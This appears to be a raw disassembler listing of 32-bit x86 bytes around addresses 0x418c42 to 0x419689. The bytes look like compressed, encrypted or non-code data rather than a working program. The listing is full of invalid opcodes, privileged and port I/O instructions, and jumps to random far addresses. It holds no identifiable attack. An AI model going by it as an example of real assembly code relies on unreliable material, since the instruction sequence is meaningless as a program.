  418c42:	bound  ebx,QWORD PTR [ecx-0x63]
  418c45:	hlt    
  418c46:	ss mov esi,0x67b186a7
  418c4c:	stos   BYTE PTR es:[edi],al
  418c4d:	or     DWORD PTR [edx-0x72],esi
  418c50:	stos   BYTE PTR es:[edi],al
  418c51:	or     DWORD PTR [esi-0x104d9879],eax
  418c57:	cmc    
  418c58:	lea    ecx,[eax]
  418c5a:	test   eax,0x4902c922
  418c5f:	jo     0x418c08
  418c61:	fld    DWORD PTR [ebp+0xa2f7b0]
  418c67:	(bad)  
  418c68:	xor    eax,0x58d52d7b
  418c6d:	out    dx,eax
  418c6e:	mov    edi,0x76e64b10
  418c73:	mov    ebp,0xdaaf6504
  418c78:	jge    0x418c28
  418c7a:	or     eax,0xb44bb393
  418c7f:	dec    ebp
  418c80:	mov    ebx,0x43b8a650
  418c85:	cmp    eax,0x5a3f8b2d
  418c8a:	sbb    BYTE PTR [ebx+0x60],dh
  418c8d:	stos   DWORD PTR es:[edi],eax
  418c8e:	rol    DWORD PTR [eax+eax*1+0x0],cl
	...
  418cf2:	add    BYTE PTR [eax],al
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	ror    BYTE PTR [ebx],cl
  418d01:	fld    QWORD PTR [esi]
  418d03:	inc    esp
  418d04:	lods   al,BYTE PTR ds:[esi]
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	mov    BYTE PTR [edi],dh
  418d0e:	(bad)  
  418d0f:	stos   BYTE PTR es:[edi],al
  418d10:	ficomp WORD PTR [edi+0x7a]
  418d13:	aam    0xd3
  418d15:	adc    eax,0x28fc687b
  418d1a:	(bad)  
  418d1b:	sar    edx,cl
  418d1d:	fcom   QWORD PTR [edx-0x6f471cd9]
  418d23:	jecxz  0x418d85
  418d25:	dec    eax
  418d26:	scas   al,BYTE PTR es:[edi]
  418d27:	push   ebx
  418d28:	jbe    0x418d81
  418d2a:	inc    esp
  418d2b:	mov    bl,0xbe
  418d2d:	loopne 0x418ce8
  418d2f:	and    BYTE PTR [ebx+esi*2],bh
  418d32:	(bad)
  418d35:	pop    ecx
  418d36:	dec    ebx
  418d37:	pop    ds
  418d38:	push   edx
  418d39:	cmp    DWORD PTR [esi+ebp*2+0x53520413],ebp
  418d40:	scas   eax,DWORD PTR es:[edi]
  418d41:	push   ss
  418d42:	scas   eax,DWORD PTR es:[edi]
  418d43:	xor    esp,DWORD PTR [ebp-0x49]
  418d46:	dec    ebp
  418d47:	mov    ch,0x2e
  418d49:	(bad)  
  418d4b:	rcl    esp,0x99
  418d4e:	int3   
  418d4f:	cmc    
  418d50:	xchg   esp,eax
  418d51:	fmul   QWORD PTR ds:0xec54491c
  418d57:	push   edx
  418d58:	fstp   DWORD PTR [ecx+0x9]
  418d5b:	cmp    ecx,DWORD PTR [edi+edi*8+0x6d]
  418d5f:	stc    
  418d60:	repnz mov WORD PTR [eax-0x1fcbacf4],es
  418d67:	xor    BYTE PTR [ebx+0x7c],cl
  418d6a:	pop    ebp
  418d6b:	dec    edi
  418d6c:	add    DWORD PTR [ecx-0x7b],edi
  418d6f:	or     al,0x3
  418d71:	and    al,0xe4
  418d73:	out    dx,al
  418d74:	pop    es
  418d75:	leave  
  418d76:	mov    esp,0x6d67e366
  418d7b:	test   BYTE PTR [ecx-0x60],dl
  418d7e:	sar    BYTE PTR [esi-0x439149ab],1
  418d84:	(bad)  
  418d85:	mov    dl,0xcf
  418d87:	cmp    DWORD PTR [ecx],eax
  418d89:	pop    ds
  418d8a:	nop
  418d8b:	push   edx
  418d8c:	rcl    BYTE PTR [ebx+0x7b],0x26
  418d90:	inc    esp
  418d91:	lds    ebx,FWORD PTR [edi+0x28e63a10]
  418d97:	sub    eax,0xc1cda7d9
  418d9c:	fbstp  TBYTE PTR [esi+0x1a]
  418d9f:	jo     0x418e0e
  418da1:	ret    
  418da2:	sbb    BYTE PTR [esi-0x24],0xd6
  418da6:	push   eax
  418da7:	(bad)  
  418da8:	dec    ebp
  418da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418daa:	mov    es,WORD PTR [ebx-0x58]
  418dad:	inc    ebp
  418dae:	and    ecx,DWORD PTR [edx+0x35]
  418db1:	ja     0x418d71
  418db3:	aam    0x22
  418db5:	clc    
  418db6:	and    esp,DWORD PTR [edx-0x4b]
  418db9:	std    
  418dba:	jno    0x418e08
  418dbc:	test   al,0x85
  418dbe:	in     al,0x4e
  418dc0:	test   DWORD PTR [edx+0x33],edx
  418dc3:	push   cs
  418dc4:	push   ebp
  418dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc6:	inc    esi
  418dc7:	outs   dx,DWORD PTR ds:[esi]
  418dc8:	cli    
  418dc9:	call   0x81950f5a
  418dce:	mov    ebp,0xfa785e98
  418dd3:	dec    esi
  418dd4:	push   esp
  418dd5:	mov    ebp,0x53067c6d
  418dda:	pusha  
  418ddb:	jnp    0x418e15
  418ddd:	xchg   DWORD PTR [esi],ebx
  418ddf:	push   ebp
  418de0:	pop    ebp
  418de1:	push   esi
  418de2:	adc    al,0x5
  418de4:	scas   eax,DWORD PTR es:[edi]
  418de5:	push   esi
  418de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418de7:	mov    DWORD PTR [ecx+0x20],esi
  418dea:	adc    eax,DWORD PTR [eax]
  418dec:	dec    esi
  418ded:	jbe    0x418e5d
  418def:	inc    ebx
  418df0:	ror    BYTE PTR [esp+eiz*4+0x50],0xfe
  418df5:	pop    esp
  418df6:	ror    BYTE PTR [eax+0x6],cl
  418df9:	inc    ebp
  418dfa:	sub    al,0x72
  418dfc:	and    eax,0xe49d24c
  418e01:	iret   
  418e02:	jmp    0x3a4:0x1a00c751
  418e09:	adc    dh,dh
  418e0b:	fist   DWORD PTR [eax+0x14]
  418e0e:	fsubr  QWORD PTR [edi+0x0]
	...
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x53]
  418e81:	stos   DWORD PTR es:[edi],eax
  418e82:	push   ebp
  418e83:	ins    BYTE PTR es:[edi],dx
  418e84:	mov    al,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	scas   al,BYTE PTR es:[edi]
  418e8d:	sub    ah,BYTE PTR [eax]
  418e8f:	loop   0x418f02
  418e91:	loop   0x418edd
  418e93:	mov    bl,0x21
  418e95:	push   eax
  418e96:	rcr    BYTE PTR [ebp+0x244f22fe],1
  418e9c:	push   ss
  418e9d:	xchg   BYTE PTR [esi],al
  418e9f:	mov    ch,0x3c
  418ea1:	rol    DWORD PTR [ebx+0x4fdc74e6],0x67
  418ea8:	pop    ss
  418ea9:	xchg   edx,eax
  418eaa:	aas    
  418eab:	repnz in eax,0x1c
  418eae:	rol    DWORD PTR [eax+0x6f],0xf3
  418eb2:	dec    edx
  418eb3:	xor    al,BYTE PTR [edx-0x20]
  418eb6:	bswap  eax
  418eb8:	js     0x418ec9
  418eba:	mov    ebp,esi
  418ebc:	and    al,0x2b
  418ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ebf:	pusha  
  418ec0:	(bad)  
  418ec2:	(bad)  
  418ec3:	sahf   
  418ec4:	pop    esp
  418ec5:	movq   mm5,mm1
  418ec8:	dec    eax
  418ec9:	xchg   edx,eax
  418eca:	adc    eax,0x9a3176ed
  418ecf:	xchg   edx,eax
  418ed0:	in     al,0x1d
  418ed2:	and    dh,BYTE PTR [eax]
  418ed4:	jge    0x418e62
  418ed6:	cmp    DWORD PTR [eax],edi
  418ed8:	sub    BYTE PTR [esi-0x7555773b],al
  418ede:	dec    esi
  418edf:	mov    WORD PTR [edi],?
  418ee1:	push   cs
  418ee2:	rcl    DWORD PTR [ecx],1
  418ee4:	(bad)  
  418ee5:	sti    
  418ee6:	dec    eax
  418ee7:	stos   BYTE PTR es:[edi],al
  418ee8:	cmp    BYTE PTR [ebp+0x9d8cb56],dl
  418eee:	xchg   DWORD PTR [esi],eax
  418ef0:	hlt    
  418ef1:	xor    BYTE PTR ds:0xf996ac83,bh
  418ef7:	xor    al,0xe9
  418ef9:	div    DWORD PTR [eax+0x46]
  418efc:	or     DWORD PTR [ebx+0x2a],edi
  418eff:	rcr    DWORD PTR [edi+eiz*8],0x44
  418f03:	mov    al,BYTE PTR [esp+ebp*1]
  418f06:	loop   0x418eb8
  418f08:	push   ecx
  418f09:	ds xchg esp,eax
  418f0b:	adc    dl,BYTE PTR [esi]
  418f0d:	push   ebp
  418f0e:	jns    0x418f3d
  418f10:	rcr    DWORD PTR [edx],cl
  418f12:	jne    0x418f34
  418f14:	xor    DWORD PTR [edx],ebp
  418f16:	push   es
  418f17:	popf   
  418f18:	xor    eax,0x654b01ad
  418f1d:	mov    ah,0xa0
  418f1f:	fs repnz xor ebp,eax
  418f23:	mov    ecx,0x57e3a568
  418f28:	out    0x42,al
  418f2a:	or     eax,0xb0ba734d
  418f2f:	xchg   ebp,eax
  418f30:	and    BYTE PTR ds:0xe8fb8d62,al
  418f36:	outs   dx,BYTE PTR ds:[esi]
  418f37:	push   esp
  418f38:	in     eax,0x59
  418f3a:	push   cs
  418f3b:	and    ebx,DWORD PTR [edi-0x69]
  418f3e:	repnz xor bl,BYTE PTR [edi]
  418f41:	pop    ebp
  418f42:	vmread DWORD PTR [ecx],esp
  418f45:	xor    al,0x1d
  418f47:	pop    eax
  418f48:	sbb    eax,0x4eb19b69
  418f4d:	push   ebp
  418f4e:	pop    ss
  418f4f:	(bad)  
  418f50:	repnz mov esi,0x3ff00547
  418f56:	aad    0xac
  418f58:	(bad)  
  418f59:	cmp    bl,BYTE PTR [edi]
  418f5b:	jno    0x418fda
  418f5d:	sub    eax,0xc281971
  418f62:	loopne 0x418fdb
  418f64:	out    0x25,al
  418f66:	mov    edx,0xfb7d98c7
  418f6b:	icebp  
  418f6c:	cmp    eax,0xab027018
  418f71:	imul   esi,esp,0xffffffc3
  418f74:	sub    edx,ebp
  418f76:	retf   0x89d3
  418f79:	mov    eax,0x77420f16
  418f7e:	xor    eax,0xf1876cfd
  418f83:	xchg   esi,eax
  418f84:	inc    edx
  418f85:	add    al,0x11
  418f87:	imul   edi,DWORD PTR [edx+eax*4],0x66
  418f8b:	stos   DWORD PTR es:[edi],eax
  418f8c:	jbe    0x418fb1
  418f8e:	mov    bh,0x7f
	...
  418ff4:	sbb    al,0x97
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x5beaf1a7]
  419001:	cs cs jmp 0x4298bc
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	lock lods al,BYTE PTR ds:[esi]
  41900e:	mov    gs,WORD PTR [eax+edx*1]
  419011:	sub    eax,0xbe767b11
  419016:	in     eax,dx
  419017:	add    edi,DWORD PTR [ebx+0x11]
  41901a:	pop    esp
  41901b:	ss jp  0x418fa2
  41901e:	or     al,0x72
  419020:	mov    esp,ecx
  419022:	mov    eax,0x1370b555
  419027:	push   ebx
  419028:	bound  ecx,QWORD PTR [eax+0x1883b1f5]
  41902e:	frstor [ebp-0x77b1e277]
  419034:	cwde   
  419035:	cdq    
  419036:	mov    DWORD PTR [ecx],ebx
  419038:	jns    0x4190a1
  41903a:	popf   
  41903b:	nop
  41903c:	out    dx,al
  41903d:	push   es
  41903e:	push   0x309083e5
  419043:	add    BYTE PTR [esi-0x1f],dh
  419046:	(bad)  
  419047:	jmp    0x9b5c:0x528eb58
  41904e:	shl    ebx,cl
  419050:	xor    eax,0x645f0e3a
  419055:	dec    edx
  419056:	aas    
  419057:	lea    ebp,[edx+0x34c96163]
  41905d:	sub    DWORD PTR [esi*1+0x759bd5a2],ebp
  419064:	aam    0x36
  419066:	push   ebp
  419067:	dec    esp
  419068:	push   cs
  419069:	add    BYTE PTR [ecx],al
  41906b:	mov    cl,0x9e
  41906d:	add    al,0x24
  41906f:	pop    ebp
  419070:	cdq    
  419071:	cmp    esp,eax
  419073:	xor    DWORD PTR [ecx],eax
  419075:	repnz lea ebx,[edx]
  419078:	pop    ebx
  419079:	mov    ebp,0xd6573c56
  41907e:	lods   eax,DWORD PTR ds:[esi]
  41907f:	retf   0x5556
  419082:	int    0x65
  419084:	call   0xd70cfedd
  419089:	push   eax
  41908a:	mov    dl,0xf9
  41908c:	(bad)  
  41908d:	jae    0x41908f
  41908f:	or     eax,0xa262cb95
  419094:	pop    eax
  419095:	inc    ebp
  419096:	or     DWORD PTR [ecx-0x2c],ebx
  419099:	addr16 inc edi
  41909b:	cdq    
  41909c:	retf   
  41909d:	or     edx,ecx
  41909f:	push   eax
  4190a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190a1:	aaa    
  4190a2:	ja     0x419047
  4190a4:	ds int3 
  4190a6:	outs   dx,DWORD PTR ds:[esi]
  4190a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190a8:	fadd   QWORD PTR [edi-0xd]
  4190ab:	ins    BYTE PTR es:[edi],dx
  4190ac:	int    0x17
  4190ae:	jno    0x419099
  4190b0:	test   DWORD PTR [eax-0x6ef67ac8],esp
  4190b6:	dec    edx
  4190b7:	int3   
  4190b8:	pop    edi
  4190b9:	scas   eax,DWORD PTR es:[edi]
  4190ba:	(bad)  
  4190bb:	mov    esi,0x94d13d22
  4190c0:	sbb    bl,BYTE PTR ds:0x80254154
  4190c6:	sbb    eax,0x68dec2c8
  4190cb:	sub    dl,BYTE PTR [esp+edi*2]
  4190ce:	mov    ds:0xb5c2bd81,eax
  4190d3:	das    
  4190d4:	sysexit 
  4190d6:	pushf  
  4190d7:	sahf   
  4190d8:	and    DWORD PTR [ebx-0x477cf0b7],ecx
  4190de:	xor    al,0x30
  4190e0:	mov    esi,0x3d250ca7
  4190e5:	xchg   ecx,eax
  4190e6:	mov    ?,edi
  4190e8:	outs   dx,BYTE PTR ds:[esi]
  4190e9:	jge    0x41914c
  4190eb:	pop    es
  4190ec:	ror    ecx,1
  4190ee:	sahf   
  4190ef:	xor    BYTE PTR [edx+eiz*2],ch
  4190f2:	mov    ch,cl
  4190f4:	jmp    0x30c2:0x69a19f6c
  4190fb:	ins    BYTE PTR es:[edi],dx
  4190fc:	lods   al,BYTE PTR ds:[esi]
  4190fd:	adc    al,0x3
  4190ff:	push   DWORD PTR [eax-0x355775f4]
  419105:	pop    ecx
  419106:	pop    ebp
  419107:	hlt    
  419108:	out    0x56,eax
  41910a:	dec    dh
  41910c:	repnz mov ah,0xa7
  41910f:	in     al,dx
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     dl,ch
  419181:	out    dx,eax
  419182:	shl    DWORD PTR [eax+edi*4],cl
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR [ecx+eax*1],al
  41918a:	add    BYTE PTR [eax],al
  41918c:	test   eax,0x68844922
  419191:	add    cl,cl
  419193:	and    al,0x19
  419195:	mov    edx,DWORD PTR [ecx]
  419197:	lds    esp,FWORD PTR [ecx]
  419199:	xchg   ecx,eax
  41919a:	dec    edi
  41919b:	push   cs
  41919c:	add    ebp,DWORD PTR [ecx+0x18]
  41919f:	push   eax
  4191a0:	data16 cmp BYTE PTR [ecx-0x5796f7c4],ah
  4191a7:	add    DWORD PTR [ebx+0x4f],ebp
  4191aa:	add    DWORD PTR [edi],edi
  4191ac:	loope  0x4191f6
  4191ae:	xor    dh,BYTE PTR [ebp-0x603162c6]
  4191b4:	mov    WORD PTR [edi+0xe12a044],?
  4191ba:	push   eax
  4191bb:	loope  0x4191b1
  4191bd:	push   ebp
  4191be:	jp     0x4191b3
  4191c0:	mov    ds:0xadec7f53,eax
  4191c5:	shr    BYTE PTR [ebx+0x7fc29773],cl
  4191cb:	repnz cld 
  4191cd:	repz pop esi
  4191cf:	jo     0x41916e
  4191d1:	iret   
  4191d2:	pop    ecx
  4191d3:	xor    al,0x38
  4191d5:	mov    al,ds:0x90dbdc77
  4191da:	or     dh,BYTE PTR [ecx-0x7c3feb08]
  4191e0:	mov    BYTE PTR [ebp+0x75e79cca],ah
  4191e6:	sbb    dh,dh
  4191e8:	mov    al,ds:0x1e4827af
  4191ed:	mov    esi,0x5fa2a530
  4191f2:	and    DWORD PTR [esi+eax*8],esp
  4191f5:	dec    ebx
  4191f6:	mov    al,0xef
  4191f8:	and    dh,bh
  4191fa:	shr    DWORD PTR [ecx+0x602e36cb],cl
  419200:	sbb    BYTE PTR [eax-0x5e60e677],ch
  419206:	sub    DWORD PTR [ebx],ebp
  419208:	pop    eax
  419209:	fistp  WORD PTR [edi*4+0x30f13a8f]
  419210:	jns    0x4191bc
  419212:	sub    DWORD PTR [eax],edi
  419214:	scas   al,BYTE PTR es:[edi]
  419215:	add    DWORD PTR [eax-0x46459ac2],esp
  41921b:	push   es
  41921c:	out    dx,al
  41921d:	pop    eax
  41921e:	je     0x41922b
  419220:	icebp  
  419221:	jne    0x4191dd
  419223:	and    eax,0x49781dd1
  419228:	sbb    edx,DWORD PTR [eax+0x54bbdcb0]
  41922e:	and    BYTE PTR [eax],cl
  419230:	inc    edx
  419231:	sub    al,0x1d
  419233:	push   ss
  419234:	arpl   WORD PTR [edx+0x5],dx
  419237:	lock retf 
  419239:	rol    BYTE PTR [esi-0x6e],1
  41923c:	cmc    
  41923d:	call   0x3384c25e
  419242:	arpl   WORD PTR ds:0xd2c59c10,bx
  419248:	dec    esi
  419249:	or     al,0x67
  41924b:	imul   edi,DWORD PTR [ecx],0xffffffe0
  41924e:	xchg   edx,eax
  41924f:	(bad)  
  419250:	pop    es
  419251:	ss xchg esi,eax
  419253:	mov    ecx,0x6c21947d
  419258:	in     al,dx
  419259:	push   ebp
  41925a:	jb     0x4191ef
  41925c:	xor    ch,BYTE PTR [edx+edi*2-0x957fee6]
  419263:	xor    ah,BYTE PTR [esi-0x6bab8bc3]
  419269:	shl    al,0xc9
  41926c:	xchg   ebx,eax
  41926d:	sub    dh,dl
  41926f:	popa   
  419270:	pusha  
  419271:	sub    eax,DWORD PTR [esi+edx*4+0x1ca01045]
  419278:	mov    eax,ds:0x76c39af6
  41927d:	jmp    0xefa2:0x719dedb6
  419284:	pusha  
  419285:	dec    eax
  419286:	fcomp  DWORD PTR [edi-0xe276fe0]
  41928c:	call   0x0:0x106585
	...
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	jge    0x4192bf
  419302:	mov    cl,0x77
  419304:	mov    esp,0x400010a
  419309:	add    DWORD PTR [eax],eax
  41930b:	add    BYTE PTR [ebx+0x3f],bh
  41930e:	shr    DWORD PTR [ebx],1
  419310:	sub    bh,BYTE PTR [edx-0x50da0fd]
  419316:	call   0x127a:0x2ef4b6a3
  41931d:	jno    0x4192f9
  41931f:	xor    BYTE PTR [ebx+0x7a],ch
  419322:	dec    esp
  419323:	pop    esi
  419324:	call   0x63b6c25e
  419329:	push   esi
  41932a:	adc    al,0x2e
  41932c:	dec    edx
  41932d:	cli    
  41932e:	and    BYTE PTR [edi-0x190632a2],ch
  419334:	pop    ds
  419335:	enter  0x9697,0xa8
  419339:	cli    
  41933a:	push   ds
  41933b:	sbb    al,0x48
  41933d:	call   DWORD PTR [edi-0x2]
  419340:	mov    ss,WORD PTR [edi+ecx*2+0x17]
  419344:	or     bl,BYTE PTR [esi]
  419346:	xchg   edx,eax
  419347:	jl     0x4193c2
  419349:	test   al,0x80
  41934b:	adc    ebp,ecx
  41934d:	iret   
  41934e:	pop    ds
  41934f:	test   al,0x43
  419351:	pusha  
  419352:	sahf   
  419353:	loop   0x419353
  419355:	(bad)  
  419356:	sub    eax,0x57d5a56f
  41935b:	popa   
  41935c:	aaa    
  41935d:	mov    eax,0x4a67a742
  419362:	push   es
  419363:	cmp    bh,BYTE PTR [eax+0xb]
  419366:	xor    BYTE PTR [ebp+0x17],0xac
  41936a:	xlat   BYTE PTR ds:[ebx]
  41936b:	mov    BYTE PTR [ecx+0x7],bh
  41936e:	cmp    al,0x86
  419370:	cs mov edx,ebx
  419373:	or     eax,0x6cf0b221
  419378:	sub    DWORD PTR [ebx],edx
  41937a:	xchg   esi,eax
  41937b:	mov    al,ds:0xbb3c050b
  419380:	pusha  
  419381:	data16 das 
  419383:	out    0xd0,eax
  419385:	add    ah,BYTE PTR [edi]
  419387:	sub    DWORD PTR [ebx-0x6faa7000],ebp
  41938d:	loope  0x4193f7
  41938f:	and    BYTE PTR [eax-0x76a9b7ce],0xdb
  419396:	fimul  WORD PTR [ecx-0x45]
  419399:	lea    eax,[ebp-0x61c2b927]
  41939f:	push   ds
  4193a0:	fbstp  TBYTE PTR [ecx]
  4193a2:	sbb    eax,0x87e18b77
  4193a7:	mov    edx,0x8da8e7f7
  4193ac:	jg     0x4193a5
  4193ae:	jle    0x41940d
  4193b0:	scas   al,BYTE PTR es:[edi]
  4193b1:	not    ebp
  4193b3:	in     al,0x4e
  4193b5:	or     BYTE PTR [edi],0xaf
  4193b8:	push   ds
  4193b9:	in     al,dx
  4193ba:	stc    
  4193bb:	loop   0x419367
  4193bd:	sub    al,bl
  4193bf:	cli    
  4193c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c1:	mov    ebx,0xfcfabccd
  4193c6:	or     al,0x25
  4193c8:	stc    
  4193c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193ca:	inc    ebx
  4193cb:	ret    
  4193cc:	jno    0x419429
  4193ce:	popf   
  4193cf:	xor    ebp,eax
  4193d1:	loope  0x4193bf
  4193d3:	jnp    0x419390
  4193d5:	inc    ebx
  4193d6:	rol    DWORD PTR [esi],1
  4193d8:	stc    
  4193d9:	or     BYTE PTR [ebx-0x57],dh
  4193dc:	push   cs
  4193dd:	inc    edi
  4193de:	out    0x48,al
  4193e0:	aas    
  4193e1:	lock xor DWORD PTR [ecx+esi*2],eax
  4193e5:	push   0x2b
  4193e7:	mul    BYTE PTR [edi]
  4193e9:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4193eb:	or     ah,BYTE PTR [edx-0x678c5e3f]
  4193f1:	inc    esi
  4193f2:	mov    DWORD PTR [ebx-0x27],0x23697a9f
  4193f9:	jl     0x41943f
  4193fb:	mov    ecx,0x137d2df1
  419400:	push   ecx
  419401:	pop    ebp
  419402:	jecxz  0x419482
  419404:	push   eax
  419405:	inc    edx
  419406:	(bad)  
  419407:	push   0x53
  419409:	out    0xbf,eax
  41940b:	scas   al,BYTE PTR es:[edi]
  41940c:	mov    al,0xc6
  41940e:	ficom  DWORD PTR [ebx+0x0]
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	mov    ds:0xc0c64edf,eax
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	sti    
  41948d:	stos   BYTE PTR es:[edi],al
  41948e:	lods   eax,DWORD PTR ds:[esi]
  41948f:	jnp    0x4194da
  419491:	and    al,BYTE PTR [eax-0x193aa547]
  419497:	div    BYTE PTR [eax+edi*8-0x657609d4]
  41949e:	ror    DWORD PTR [edi+0x3c55866c],cl
  4194a4:	aaa    
  4194a5:	int3   
  4194a6:	aam    0x4b
  4194a8:	ja     0x419476
  4194aa:	pop    eax
  4194ab:	aam    0xd6
  4194ad:	cmp    al,0x7a
  4194af:	mov    gs,ecx
  4194b1:	test   DWORD PTR [esi+edx*8+0x3e],ebx
  4194b5:	lods   eax,DWORD PTR ds:[esi]
  4194b6:	inc    ecx
  4194b7:	add    BYTE PTR [edi+0x7f],bl
  4194ba:	adc    eax,0x996f8ea4
  4194bf:	sub    ebx,DWORD PTR [esi]
  4194c1:	xor    BYTE PTR [esi+0x22],dh
  4194c4:	cwde   
  4194c5:	enter  0x54ea,0x1a
  4194c9:	or     BYTE PTR [edi],bl
  4194cb:	or     eax,0xd05380bb
  4194d0:	and    al,0x41
  4194d2:	mov    ds:0x22b2b492,eax
  4194d7:	jo     0x4194fe
  4194d9:	push   es
  4194da:	call   DWORD PTR [ebx]
  4194dc:	outs   dx,BYTE PTR ds:[esi]
  4194dd:	jb     0x4194e0
  4194df:	push   0xffffffaf
  4194e1:	jbe    0x419474
  4194e3:	mov    eax,ds:0xd09c4f29
  4194e8:	nop
  4194e9:	stos   DWORD PTR es:[edi],eax
  4194ea:	mov    ch,0xbf
  4194ec:	cmc    
  4194ed:	sub    BYTE PTR [ebx-0x3af22015],0x64
  4194f4:	inc    edx
  4194f5:	pop    esi
  4194f6:	lahf   
  4194f7:	dec    ebx
  4194f8:	pop    ebp
  4194f9:	lahf   
  4194fa:	(bad)  
  4194fc:	push   DWORD PTR [esi+0x1b]
  4194ff:	gs out dx,eax
  419501:	les    esi,FWORD PTR [edx-0x43115580]
  419507:	outs   dx,BYTE PTR ds:[esi]
  419508:	test   eax,0x9e2df0ea
  41950d:	pushf  
  41950e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41950f:	nop
  419510:	xchg   ch,al
  419512:	mov    ah,0x31
  419514:	and    BYTE PTR [esi],0xe4
  419517:	test   eax,0xd96e56a8
  41951c:	jbe    0x4194be
  41951e:	sbb    dl,BYTE PTR [edx-0x510479fa]
  419524:	xor    al,0xfc
  419526:	push   ss
  419527:	outs   dx,DWORD PTR ds:[esi]
  419528:	add    cl,al
  41952a:	add    eax,DWORD PTR [ebp+ebp*1-0x26ff7c26]
  419531:	retf   0x6b0d
  419534:	pop    edx
  419535:	or     eax,0x58fb5939
  41953a:	arpl   WORD PTR [edx-0x3c],ax
  41953d:	cmp    dl,BYTE PTR [esi+0x0]
  419540:	arpl   WORD PTR [edx],bx
  419542:	xchg   ebx,eax
  419543:	mov    ah,0xd4
  419545:	cmp    edx,DWORD PTR [edi-0x66]
  419548:	popf   
  419549:	ds jecxz 0x419548
  41954c:	sar    DWORD PTR [edi+eax*2+0xf71786e],1
  419553:	mov    al,ds:0x549cdb2
  419558:	mov    DWORD PTR [edx-0x452d8cbe],ebx
  41955e:	pop    ebx
  41955f:	and    eax,0xe6895ae5
  419564:	xor    ch,BYTE PTR [edi+0x17dc9e61]
  41956a:	adc    al,0xbb
  41956c:	(bad)  [edi+eiz*2+0x50]
  419570:	mov    al,ds:0xc8723aef
  419575:	pop    ebp
  419576:	cmp    bl,BYTE PTR [ebp-0x78d5d1de]
  41957c:	fwait
  41957d:	dec    ecx
  41957e:	and    DWORD PTR [ecx+0x5f0481e2],edi
  419584:	loope  0x419585
  419586:	lds    edx,FWORD PTR [ebp-0x63]
  419589:	ds int3 
  41958b:	(bad)  
  41958c:	je     0x4195ff
  41958e:	jge    0x419590
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	fimul  DWORD PTR [ebx]
  419602:	scas   eax,DWORD PTR es:[edi]
  419603:	retf   0xcc4
  419606:	add    DWORD PTR [eax],eax
  419608:	add    al,0x1
  41960a:	add    BYTE PTR [eax],al
  41960c:	(bad)  
  41960e:	retf   
  41960f:	inc    esi
  419610:	call   0xf61c8de4
  419615:	inc    esp
  419616:	mov    ah,BYTE PTR [ecx-0x454dcccf]
  41961c:	mov    edx,0x8d5f2442
  419621:	dec    ecx
  419622:	add    eax,0xd0e04b1e
  419627:	icebp  
  419628:	outs   dx,DWORD PTR ds:[esi]
  419629:	push   ebx
  41962a:	dec    ebp
  41962b:	jl     0x419638
  41962d:	sub    al,0x78
  41962f:	or     al,0x2e
  419631:	ret    
  419632:	dec    edx
  419633:	pusha  
  419634:	jl     0x41968f
  419636:	jnp    0x41968e
  419638:	xor    eax,0xf2bb5e76
  41963d:	pop    edx
  41963e:	sbb    esp,ebx
  419640:	mov    eax,0xe5be2ce5
  419645:	add    eax,0x4485ece2
  41964a:	out    dx,al
  41964b:	in     al,0xb2
  41964d:	cdq    
  41964e:	lock cmp al,0x69
  419651:	lock adc eax,0x8b521327
  419657:	fld    QWORD PTR [esi-0x106c7400]
  41965d:	test   al,0x46
  41965f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419660:	outs   dx,DWORD PTR ds:[esi]
  419661:	call   0x3647798
  419666:	dec    ebp
  419667:	js     0x4196de
  419669:	cli    
  41966a:	in     eax,dx
  41966b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41966c:	pop    ds
  41966d:	inc    ebp
  41966e:	in     eax,dx
  41966f:	(bad)  
  419670:	push   ebp
  419671:	push   ecx
  419672:	xor    ebp,edx
  419674:	adc    cl,BYTE PTR [ecx]
  419676:	pop    ebx
  419677:	loop   0x4196ae
  419679:	xchg   ecx,eax
  41967a:	popf   
  41967b:	(bad)  
  41967c:	(bad)  
  41967d:	call   0x99c6:0x10f0f8fe
  419684:	push   0x375a7e96
  419689:	xor    ch,ah
